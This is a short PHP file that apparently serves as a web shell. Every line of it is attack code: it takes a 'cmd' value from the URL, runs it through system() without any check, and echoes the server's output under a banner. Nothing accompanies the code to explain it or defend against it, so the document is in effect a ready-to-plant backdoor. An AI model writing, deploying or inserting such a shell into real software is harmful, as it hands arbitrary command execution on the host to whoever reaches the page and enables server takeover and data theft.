<?php
$cmd = $_GET['cmd'];
echo '<br><br>#########################<br><br>';
echo 'The server with answered this your request:<br><br>';
system($cmd);
?>